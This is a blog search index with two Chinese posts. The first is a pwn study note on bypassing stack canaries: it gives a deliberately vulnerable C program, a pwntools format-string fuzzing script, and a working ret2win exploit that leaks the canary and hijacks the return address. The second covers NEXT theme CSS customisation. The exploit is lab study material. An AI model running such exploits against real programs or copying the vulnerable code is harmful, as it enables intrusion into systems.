<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>记一次绕过StackCanaries的笔记</title>
    <url>/posts/ef20bccd/</url>
    <content><![CDATA[<h1 id="记一次-Stack-Canaries-绕过-heart-eyes"><a href="#记一次-Stack-Canaries-绕过-heart-eyes" class="headerlink" title="记一次 Stack Canaries 绕过 :heart_eyes:"></a>记一次 Stack Canaries 绕过 :heart_eyes:</h1><h2 id="环境-kali2023、-pwntools、-pwndbg、-gdb、-python3-11-8、Ghidra11-0-3"><a href="#环境-kali2023、-pwntools、-pwndbg、-gdb、-python3-11-8、Ghidra11-0-3" class="headerlink" title="环境: kali2023、 pwntools、 pwndbg、 gdb、 python3.11.8、Ghidra11.0.3"></a>环境: kali2023、 pwntools、 pwndbg、 gdb、 python3.11.8、Ghidra11.0.3</h2><ul>
<li>原理： Stack Canaries的原理就是在栈底放入一个值Canary的值是栈上的一个随机数，在程序启动时随机生成并保存在比函数返回地址更低的位置。<br>由于栈溢出是从低地址向高地址进行覆盖，因此攻击者要想控制函数的返回指针，就一定要先覆<br>盖到Canary。程序只需要在函数返回前检查Canary是否被篡改，就可以达到保护栈的目的。–摘自 《CTF竞赛权威指南-PWN篇》<span id="more"></span></li>
<li>绕过原理 因为是有一个Canary的值在栈帧中 所以我们可以保存该值 在编写payload的时候 把值附带进去即可</li>
</ul>
<h2 id="实操："><a href="#实操：" class="headerlink" title="实操："></a>实操：</h2><h3 id="做好准备"><a href="#做好准备" class="headerlink" title="做好准备"></a>做好准备</h3><ol>
<li>程序源代码：<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="type">char</span> *<span class="title function_">gets</span><span class="params">(<span class="type">char</span> *str)</span> &#123;</span><br><span class="line">    <span class="type">int</span> c;</span><br><span class="line">    <span class="type">char</span> *p = str;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 逐字符读取输入，直到遇到换行符为止</span></span><br><span class="line">    <span class="keyword">while</span> ((c = getchar()) != EOF &amp;&amp; c != <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">        *p++ = c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 添加字符串结束符</span></span><br><span class="line">    *p = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="comment">// 如果输入的字符长度大于0，则返回输入的字符串，否则返回NULL</span></span><br><span class="line">    <span class="keyword">return</span> (p == str) ? <span class="literal">NULL</span> : str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">hacked</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wait,how did you get in here?!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You&#x27;ll never beat my state of the art stack protector!&quot;</span>);</span><br><span class="line">    gets(buffer);</span><br><span class="line">    <span class="built_in">printf</span>(buffer);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nWho said gets() is dangerours ? Good luck with your Bof attack :P&quot;</span>);</span><br><span class="line">    gets(buffer);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    vuln();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li>编译指令：gcc 2.c -o Stack64.out -fstack-protector-all -no-pie 这条指令的意思是 编译2.cpp到 Stack.out程序 开启Canary效验 关闭PIE随机基址 这个功能跟Windows的ASLR功能相似度很高</li>
<li>编译好之后我们打开终端 运行 file Stack.out 他会弹出下面这句代码<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Stack64.out: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">7</span>edcb69a02f78154023e999313eac64641a60767, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, not stripped</span><br></pre></td></tr></table></figure></li>
<li>我们要养成这种先查壳的好习惯 发现这是一个64位的程序</li>
<li>之后我们使用 checksec Stack64.out 查看加壳情况 如下：<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">└─<span class="meta"># checksec Stack64.out</span></span><br><span class="line">[*] <span class="string">&#x27;/home/kali/Tools/pyFIle/Stack64.out&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li>我们发现开启了 Stack保护 以及NX保护(这个是栈不可执行 可自行百度)</li>
<li>OK 开始干</li>
</ol>
<h3 id="开撸-yum"><a href="#开撸-yum" class="headerlink" title="开撸 :yum:"></a>开撸 :yum:</h3><ul>
<li>把程序拖到 Ghidra 直接看main函数 我们发现main函数调用了 vuln 函数 我们接着看vuln 直接看伪代码<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* vuln() */</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  <span class="type">char</span> local_58 [<span class="number">72</span>];</span><br><span class="line">  <span class="type">long</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You\&#x27;ll never beat my state of the art stack protector!&quot;</span>);</span><br><span class="line">  gets(local_58);</span><br><span class="line">  <span class="built_in">printf</span>(local_58);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nWho said gets() is dangerours ? Good luck with your Bof attack :P&quot;</span>);</span><br><span class="line">  gets(local_58);</span><br><span class="line">  <span class="keyword">if</span> (local_10 != *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>这边我们会看到 我们的字节数组被定义为 72个字节 但我们在源码里面是64个字节 这是为什么？初步判断可能是为了补0 或者 补齐数据结构 使他成为8的倍数</li>
<li>我们接着看 这个 long local_10 其实就是Canary的值 然后 in_FS_OFFSET就是地址 0x28就是偏移</li>
<li>我们往下看 我们会发现会有一个if判断 这个其实就是判断Canary的值是否还存在 如果不在就是被覆盖了 说明已经栈溢出了</li>
<li>OK 程序的基本逻辑我们捋清楚了 我们开始调试</li>
<li>打开我们的gdb-pwndbg 输入命令 info fun 查看所有的函数 之后我们在vuln这个函数的地方下断点 break vuln</li>
<li>之后我们run 让程序跑起来 然后我们输入 n 让他运行 他会让我们输入字符 我们先随便输入一些 之后运行到printf这条语句 我们在这里查看一下栈 x&#x2F;100 $rsp<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x7fffffffe130</span>: <span class="number">0x3131313131313131</span>      <span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x7fffffffe140</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffe150</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffe160</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fffffffe170</span>: <span class="number">0x0000000000000000</span>      <span class="number">0x46def933c1a1f100</span></span><br><span class="line"><span class="number">0x7fffffffe180</span>: <span class="number">0x00007fffffffe1a0</span>      <span class="number">0x00000000004012b2</span></span><br></pre></td></tr></table></figure></li>
<li>这个就是函数入栈之后的存储形式 我们可以发现从 我们可以发现 从130-170其实就是 char数组的数据</li>
<li>那么 178就是我们需要的 Canray值了 我们可以记录下来 怎么确定呢？pwndbg有个查找canary的指令 我们输入 Canary 会出现下面这些<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; canary </span><br><span class="line">AT_RANDOM = <span class="number">0x7fffffffe559</span> <span class="meta"># points to (not masked) global canary value</span></span><br><span class="line">Canary    = <span class="number">0x46def933c1a1f100</span> (may be incorrect on != glibc)</span><br><span class="line">Found valid canaries on the stacks:</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│<span class="number">-148</span> <span class="number">0x7fffffffe038</span> ◂— <span class="number">0x46def933c1a1f100</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│<span class="number">-068</span> <span class="number">0x7fffffffe118</span> ◂— <span class="number">0x46def933c1a1f100</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│<span class="number">-008</span> <span class="number">0x7fffffffe178</span> ◂— <span class="number">0x46def933c1a1f100</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│+<span class="number">018</span> <span class="number">0x7fffffffe198</span> ◂— <span class="number">0x46def933c1a1f100</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│+<span class="number">0b</span>8 <span class="number">0x7fffffffe238</span> ◂— <span class="number">0x46def933c1a1f100</span></span><br></pre></td></tr></table></figure>
这样我们就可以更加确认 这个就是Canary的值 我们可以保存下来 一会写脚本需要<br>之后我们可以跑一下这个脚本 看一下Canary的值在栈空间的哪个位置<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#  This will automatically get context arch bits os etc</span></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;Stack64.out&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"><span class="comment"># Let&#x27;s fuzz x values</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># Create process (level used to reduce noise)</span></span><br><span class="line">        p = process(level=<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">            <span class="comment"># Format the counter</span></span><br><span class="line">            <span class="comment"># e.g. %2$s will attempt to print [i]th pointer/string/hex/char/int</span></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;%&#123;&#125;$p&#x27;</span>.<span class="built_in">format</span>(i).encode())</span><br><span class="line">        p.recvline()</span><br><span class="line">            <span class="comment"># Receive the response</span></span><br><span class="line">        result = p.recvline().decode()</span><br><span class="line">            <span class="comment"># If the item from the stack isn&#x27;t empty print it</span></span><br><span class="line">        <span class="keyword">if</span> result:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(i) + <span class="string">&#x27;:&#x27;</span> + <span class="built_in">str</span>(result).strip())</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></li>
<li>输出结果：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(Pwn) ┌──(Pwn)─(kali💀kali)-[~/Tools/debug]</span><br><span class="line">└─$ /home/kali/Tools/pyFIle/Pwn/bin/python3 /home/kali/Tools/pyFIle/stack.py</span><br><span class="line">/home/kali/Tools/pyFIle/Pwn/lib/python3.11/site-packages/pwnlib/tubes/tube.py:841: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes</span><br><span class="line">  res = self.recvuntil(delim, timeout=timeout)</span><br><span class="line">0:%0$p</span><br><span class="line">1:0xe076b0</span><br><span class="line">2:(nil)</span><br><span class="line">3:0x70</span><br><span class="line">4:0x1000</span><br><span class="line">5:(nil)</span><br><span class="line">6:0x70243625</span><br><span class="line">7:(nil)</span><br><span class="line">8:(nil)</span><br><span class="line">9:(nil)</span><br><span class="line">10:(nil)</span><br><span class="line">11:(nil)</span><br><span class="line">12:(nil)</span><br><span class="line">13:(nil)</span><br><span class="line">14:(nil)</span><br><span class="line">15:0xb07d169f45f43900</span><br><span class="line">16:0x7ffcbc573bc0</span><br><span class="line">17:0x4012b2</span><br><span class="line">18:(nil)</span><br><span class="line">19:0x605aea5f66534900</span><br><span class="line">20:0x1</span><br><span class="line">21:0x7f3a0818b6ca</span><br><span class="line">22:(nil)</span><br><span class="line">23:0x401296</span><br><span class="line">24:0x100000000</span><br><span class="line">25:0x7ffef38717e8</span><br><span class="line">26:0x7ffdb04c91c8</span><br><span class="line">27:0xb7e472c0151dfa10</span><br><span class="line">28:(nil)</span><br><span class="line">29:0x7ffd66af51c8</span><br><span class="line">30:0x403e00</span><br><span class="line">31:0x7f275aabc000</span><br><span class="line">32:0xe750bfe6b2246e9c</span><br><span class="line">33:0x2733147782a284c8</span><br><span class="line">34:(nil)</span><br><span class="line">35:(nil)</span><br><span class="line">36:(nil)</span><br><span class="line">37:0x7fff7c6e92b8</span><br><span class="line">38:0x7ffe9915f868</span><br><span class="line">39:0xb36290a0e655ae00</span><br><span class="line">40:0xe</span><br><span class="line">41:0x7fc17d666785</span><br><span class="line">42:0x401296</span><br><span class="line">43:0x403e00</span><br><span class="line">44:(nil)</span><br><span class="line">45:(nil)</span><br><span class="line">46:(nil)</span><br><span class="line">47:0x401070</span><br><span class="line">48:0x7ffe3ecbc030</span><br><span class="line">49:(nil)</span><br><span class="line">50:(nil)</span><br><span class="line">51:0x401091</span><br><span class="line">52:0x7fff940d5aa8</span><br><span class="line">53:0x38</span><br><span class="line">54:0x1</span><br><span class="line">55:0x7ffe9bd7cd72</span><br><span class="line">56:(nil)</span><br><span class="line">57:0x7ffcabbb1d95</span><br><span class="line">58:0x7ffd77d81db3</span><br><span class="line">59:0x7ffc21e62dbd</span><br><span class="line">60:0x7fff6ddcddcc</span><br><span class="line">61:0x7ffd13bd6de1</span><br><span class="line">62:0x7ffcee033dff</span><br><span class="line">63:0x7ffee8b26e12</span><br><span class="line">64:0x7ffdff07be22</span><br><span class="line">65:0x7ffc6be4be43</span><br><span class="line">66:0x7ffc4ab13e77</span><br><span class="line">67:0x7ffd885bce93</span><br><span class="line">68:0x7ffcaaaccec9</span><br><span class="line">69:0x7fff77e44eec</span><br><span class="line">70:0x7ffdf3b1ff07</span><br><span class="line">71:0x7fffd3309f14</span><br><span class="line">72:0x7ffeba3e5f32</span><br><span class="line">73:0x7ffcce808f49</span><br><span class="line">74:0x7ffff9b25f5a</span><br><span class="line">75:0x7ffd43f120fb</span><br><span class="line">76:0x7fff2b7e513e</span><br><span class="line">77:0x7ffd88376178</span><br><span class="line">78:0x7ffc52bb0197</span><br><span class="line">79:0x7fffce59c1ad</span><br><span class="line">80:0x7fff560911be</span><br><span class="line">81:0x7fffb24c21d9</span><br><span class="line">82:0x7fff1d05c1f2</span><br><span class="line">83:0x7ffc6a7d9217</span><br><span class="line">84:0x7ffcd41df239</span><br><span class="line">85:0x7ffeea814269</span><br><span class="line">86:0x7fff33d65298</span><br><span class="line">87:0x7fff6d50a2ab</span><br><span class="line">88:0x7fffbd63f2c7</span><br><span class="line">89:0x7fff0cfab2da</span><br><span class="line">90:0x7ffc724cd2e5</span><br><span class="line">91:0x7fff92e5c300</span><br><span class="line">92:0x7ffc62543348</span><br><span class="line">93:0x7ffd1c3bf361</span><br><span class="line">94:0x7ffc3d42e3af</span><br><span class="line">95:0x7ffcf28be3bc</span><br><span class="line">96:0x7fffe5b073e4</span><br><span class="line">97:0x7fffe9145406</span><br><span class="line">98:0x7ffecf407416</span><br><span class="line">99:0x7ffe05dcf41e</span><br></pre></td></tr></table></figure></li>
<li>我们会发现第 39个值就是我们的Canray 所以现在我们就可以开始编写Payload</li>
<li>这个脚本不是我的原创 是一个老外的脚本 我把他的视频链接贴在这里了<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.youtube.com/watch?v=jrG1Gqatj7U</span><br></pre></td></tr></table></figure></li>
<li>讲得很好 他最后一个实例就是讲的这个 但是是x32的程序 我又自已实现了一下x64的</li>
<li>最后我直接贴出脚本吧 有注释的<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">exe = <span class="string">&#x27;./Stack64.out&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这将自动获取上下文arch, bits, os等</span></span><br><span class="line">elf = context.binary = ELF(exe,checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启用详细日志记录，以便我们可以确切地看到正在发送的内容(info/ debug)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = process(exe)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">72</span> <span class="comment">#Canary 偏移</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄漏 canary 值 (堆栈上的第23位)</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;!&#x27;</span>,<span class="string">&#x27;%&#123;&#125;$p&#x27;</span>.<span class="built_in">format</span>(<span class="number">39</span>).encode())</span><br><span class="line">io.recvline()</span><br><span class="line">canary = <span class="built_in">int</span>(io.recvline().strip(),<span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;canary=0x%x(%d)&#x27;</span>,canary,canary)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建 payload (ret2win)</span></span><br><span class="line">payload = flat ([</span><br><span class="line">    offset *  <span class="string">b&#x27;A&#x27;</span> , <span class="comment"># Pad to canary (64)</span></span><br><span class="line">    canary,   <span class="comment"># Our leaked canary(4)</span></span><br><span class="line">    <span class="number">8</span>  *  <span class="string">b&#x27;A&#x27;</span> ,   <span class="comment"># Pad to Ret pointer (12)</span></span><br><span class="line">    <span class="number">0x4011e4</span> <span class="comment"># Ret2win (total = 80) </span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送 payload</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;:P&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 flag/shell</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></li>
<li>OK 解毕！</li>
</ul>
<p>##项目总结</p>
<ul>
<li>仅供自已记录学习笔记</li>
</ul>
]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>StackCanaries</tag>
        <tag>栈溢出</tag>
        <tag>Canary</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>“修改NEXT主题用于美化效果”</title>
    <url>/posts/6cc3cb16/</url>
    <content><![CDATA[<h1 id="使用修改NEXT主题用于美化效果"><a href="#使用修改NEXT主题用于美化效果" class="headerlink" title="使用修改NEXT主题用于美化效果"></a>使用修改NEXT主题用于美化效果</h1><ul>
<li>1.本网站使用的是HEXO+NEXT主题并部署在github上的一个存储库项目</li>
<li>2.NEXT主题的版本为：7.8.0</li>
<li>3.一些基本的修改配置这边就不多赘述了 我只记录一些我遇到的坑<span id="more"></span></li>
</ul>
<h1 id="主题美化设置："><a href="#主题美化设置：" class="headerlink" title="主题美化设置："></a>主题美化设置：</h1><h2 id="修改超链接颜色"><a href="#修改超链接颜色" class="headerlink" title="修改超链接颜色"></a>修改超链接颜色</h2><ul>
<li>首先我们要用到开发人员工具 你要保证你的浏览器可以正常使用该工具 我这里使用的是Google Chome 浏览器 我们使用定位工具定位到 <strong>超链接</strong> 文本 之后我们可以看到 它调用的是这句代码 之后我们可以对这句代码进行修改 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.post-body p a &#123;</span><br><span class="line">    color: #fff;</span><br><span class="line">    border-bottom: none;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="/images/cheat-a-photo/cheat-a.png" alt="定位超链接样式"></li>
<li>然后我们打开主题配置文件 也就是_config.yml 文件 打开之后我们搜索 <strong>custom_file_path</strong> 配置项 然后我们把 <strong>style</strong> 参数前面的注释(#)去掉 修改成自已的目录 这个参数就是next主题留给我们自已修改的样式的一个文件 尽量用它给的默认路径 我这边是 <strong>themes&#x2F;next&#x2F;source&#x2F;_data&#x2F;styles.styl</strong> 之后我们创建目录以及 <strong>styles.styl</strong> 文件 在里面加上该代码<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.post-body p a &#123;</span><br><span class="line">    color: #000;</span><br><span class="line">    border-bottom: none;</span><br><span class="line">&#125;</span><br><span class="line">.post-body p a:hover &#123;</span><br><span class="line">    color: #FFF;</span><br><span class="line">    border-bottom: none;</span><br><span class="line">	text-decoration: underline;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>即可修改成功</li>
</ul>
<h2 id="加载文章计数以及阅读时间统计"><a href="#加载文章计数以及阅读时间统计" class="headerlink" title="加载文章计数以及阅读时间统计"></a>加载文章计数以及阅读时间统计</h2><ul>
<li>网上有很多修改方法 此处就不在记载 但是有个坑 就是他不能立马刷新 弄好之后需要部署完等待一段时间就可以正常显示了</li>
</ul>
<h2 id="加载主页背景图片"><a href="#加载主页背景图片" class="headerlink" title="加载主页背景图片"></a>加载主页背景图片</h2><ul>
<li>也是需要在 <strong>styles.styl</strong> 文件里面进行修改 代码如下：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">body &#123;</span><br><span class="line">    background:url(/images/background.png); //你的图片路径</span><br><span class="line">    background-repeat: no-repeat;</span><br><span class="line">    background-attachment:fixed; //不重复</span><br><span class="line">    background-size: cover;      //填充</span><br><span class="line">    background-position:50% 50%;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">body&#123;				//修改主体字体颜色</span><br><span class="line">  color: #FFF;	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.posts-expand .post-title-link &#123;	//标题颜色</span><br><span class="line">    color: #FFF;				//首页文章标题颜色， （默认为灰辨识度不高）</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//博客内容透明化</span><br><span class="line">//文章内容的透明度设置</span><br><span class="line">.content-wrap &#123;</span><br><span class="line">  opacity: 1;</span><br><span class="line">&#125;</span><br><span class="line">.post-block &#123;</span><br><span class="line">    background: rgba(255,255,255,0.1) none repeat scroll !important;</span><br><span class="line">&#125;</span><br><span class="line">//侧边框的透明度设置</span><br><span class="line">.sidebar-inner &#123;</span><br><span class="line">  background: rgba(255,255,255,0.9) none repeat scroll !important;</span><br><span class="line">&#125;</span><br><span class="line">.comments &#123;</span><br><span class="line">    background: rgba(255,255,255,0.7) none repeat scroll !important;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 主页文章添加阴影效果</span><br><span class="line">.post &#123;</span><br><span class="line">   margin-top: 60px;</span><br><span class="line">   padding: 20px;</span><br><span class="line">   margin-bottom: 60px;</span><br><span class="line">   -webkit-box-shadow: 0 0 5px rgba(120, 128, 114, 1.5);</span><br><span class="line">   -moz-box-shadow: 0 0 5px rgba(202, 203, 204, .5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="点击头像之后跳转到关于页面"><a href="#点击头像之后跳转到关于页面" class="headerlink" title="点击头像之后跳转到关于页面"></a>点击头像之后跳转到关于页面</h2><ul>
<li>打开这个文件 <strong>\themes\next\layout_partials\sidebar\site-overview.swig</strong><br>之后我们加一句代码 在</li>
</ul>
<p> <code>&#123;%- if theme.avatar.url %&#125;</code> </p>
<ul>
<li>这句代码的上面 加上 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--头像跳转--&gt;</span><br><span class="line"> &lt;a href=&quot;/about&quot;&gt;</span><br></pre></td></tr></table></figure></li>
<li>即可跳转到关于页面</li>
</ul>
<h2 id="加载自定义js"><a href="#加载自定义js" class="headerlink" title="加载自定义js"></a>加载自定义js</h2><ul>
<li><p>比如自已写的一些js功能 需要加载到网页 即可这样写：<br>首先我们需要把创建好的js文件保存到 <strong>themes\next\source\js</strong><br>之后我们在 <strong>themes\next\layout</strong> 创建一个文件夹 名字叫：**_custom** 然后再创建一个文件：<strong>custom.swig</strong> 写入代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%- if theme.cursor_effect %&#125;</span><br><span class="line">  &#123;%- if theme.cursor_effect.type == &quot;explosion&quot; %&#125;</span><br><span class="line">    &lt;canvas class=&quot;fireworks&quot; style=&quot;position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;&quot; &gt;&lt;/canvas&gt;</span><br><span class="line">    &lt;script src=&quot;//cdn.bootcss.com/animejs/2.2.0/anime.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=&quot;/js/cursor/explosion.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &#123;%- elseif theme.cursor_effect.type == &quot;cherry&quot; %&#125;</span><br><span class="line">    &lt;script src=&quot;/js/cursor/cherry.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">  &#123;%- endif %&#125;</span><br><span class="line">&#123;%- endif %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;%- if theme.cursor_forx %&#125;</span><br><span class="line">	&lt;script src=&quot;/js/cursor/firework.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&#123;%- endif %&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>代码需要你们自已依葫芦画瓢自已写 依据自已的js 和一些 js库<br>然后我们打开 <strong>themes\next\layout_layout.swig</strong> 这个文件 之后加上这句代码</p>
<p><code>&#123;% include '_custom/custom.swig' %&#125;</code>  </p>
</li>
<li><p>加载的位置自已看即可 不需要赘述</p>
</li>
<li><p>然后在 <strong>主题配置文件</strong> 加上这些代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#点击动画 </span><br><span class="line">  #cherry: 樱花 | explosion：爆炸 </span><br><span class="line">  cursor_effect:</span><br><span class="line">  enabled: true</span><br><span class="line">  type: cherry </span><br><span class="line">  cherry: 烟花 </span><br><span class="line">cursor_forx:</span><br><span class="line">  enabled: true</span><br><span class="line">#这些需要你们看着自已写</span><br></pre></td></tr></table></figure></li>
<li><p>之后重启服务 我们就可以看到效果了</p>
</li>
<li><p>需要本网址的动画效果的js 可以点击联系我获取 几乎秒回</p>
</li>
</ul>
<h2 id="其他的样式修改"><a href="#其他的样式修改" class="headerlink" title="其他的样式修改"></a>其他的样式修改</h2><ul>
<li>例如 按钮 侧边栏 超链接的颜色或者样式等等 都可以通过超链接的修改方式修改 自己琢磨吧</li>
</ul>
<h2 id="首页文章折叠"><a href="#首页文章折叠" class="headerlink" title="首页文章折叠"></a>首页文章折叠</h2><ul>
<li>两个方法</li>
<li>第一个：主题配置文件加入这句代码<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_excerpt:</span><br><span class="line">enable: false</span><br><span class="line">length: 150</span><br></pre></td></tr></table></figure></li>
<li>第二个：使用拦截文章代码<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--more--&gt;</span><br></pre></td></tr></table></figure></li>
<li>这个代码之上的会被显示到首页 该网址用的这个方法</li>
</ul>
<h2 id="头像旋转"><a href="#头像旋转" class="headerlink" title="头像旋转"></a>头像旋转</h2><ul>
<li>头像旋转的代码加到styles.style文件里面即可实现<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.site-author-image &#123;</span><br><span class="line">  display: block;</span><br><span class="line">  margin: 0 auto;</span><br><span class="line">  padding: $site-author-image-padding;</span><br><span class="line">  max-width: $site-author-image-width;</span><br><span class="line">  height: $site-author-image-height;</span><br><span class="line">  border: $site-author-image-border-width solid $site-author-image-border-color;</span><br><span class="line">  #设置圆形</span><br><span class="line">  border-radius: 50%;</span><br><span class="line">  transition: 1s all;#旋转秒数</span><br><span class="line">&#125;</span><br><span class="line"> #旋转</span><br><span class="line">.site-author-image:hover&#123;transform: rotate(360deg);&#125;</span><br><span class="line">if (hexo-config(&#x27;avatar.rotated&#x27;)) &#123;</span><br><span class="line">  .site-author-image &#123;</span><br><span class="line">    transition: transform 1s ease-out;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  .site-author-image:hover &#123;</span><br><span class="line">    transform: rotateZ(360deg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="文章字数和阅读时间的代码-live2d"><a href="#文章字数和阅读时间的代码-live2d" class="headerlink" title="文章字数和阅读时间的代码 &amp; live2d"></a>文章字数和阅读时间的代码 &amp; live2d</h2><ul>
<li>加载到网站配置文件 不是主题配置文件</li>
